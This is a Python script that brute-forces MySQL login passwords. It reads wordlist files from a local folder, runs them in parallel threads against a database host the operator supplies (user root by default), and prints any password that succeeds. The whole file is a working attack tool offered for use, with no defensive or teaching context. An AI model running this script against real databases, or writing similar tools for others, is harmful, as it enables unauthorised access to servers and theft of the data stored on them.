import mysql.connector as msc,threading as td, os,argparse,sys
from signal import SIGKILL

#Create Folder
def Create_andCheck() -> bool:
    if os.path.exists('All_Pass'):
        return  True  
    os.mkdir("All_Pass")
    return True
# Check Folder
def check_folder(files_count:int) -> bool:
    all_list=os.listdir('All_Pass')
    if not all_list:
        return False
    if len(all_list) < files_count:
        print("The Folder Should Have %s files But There is Only"% files_count,len(all_list))
        return False
    return True

#return List of Files
def GetFiles(files_count:int)->list:
    all_list=os.listdir('All_Pass')
    return all_list[:files_count]

#Connect
def Connect(password,host:str,port:int,user:str):
    try:
        msc.connect(user=user, password=password,port=port, host=host, database=None)
    except:
        return False
    print(f"{password} is The Correct Password")
    os.kill(os.getpid(),SIGKILL)
#Attack
def Read_Attack(file_name:str,host:str,port:int,user:str):
    passwords=open(f"All_Pass/{file_name}")
    for i in passwords.readlines():
        Connect(i,host,port,user)
    

parser = argparse.ArgumentParser()
parser.add_argument("-th", "--Threads", help = "Numbers Of Threds")
args = parser.parse_args()
if args.Threads:
    print("You Selected %s Threads"% int(args.Threads))
    Create_andCheck()
    input(f"Please Put {args.Threads} Passwords files in 'All_Pass' Dirctory And Press Enter")
    if not check_folder(int(args.Threads)):
        print('The Password Folder is Empty')
        sys.exit()
    files=GetFiles(int(args.Threads))
    db_host=input("Enter The Host OF The Database --> ")
    db_port=int(input("Enter The Port OF The Database (default=3306)--> "))
    db_user=input("Enter The User OF The Database (default=root)--> ")
    for i in files:
        thread = td.Thread(target=Read_Attack, args=(i,db_host,db_port or 3306,db_user or "root"))
        thread.start()
    print("Password Didn't Match")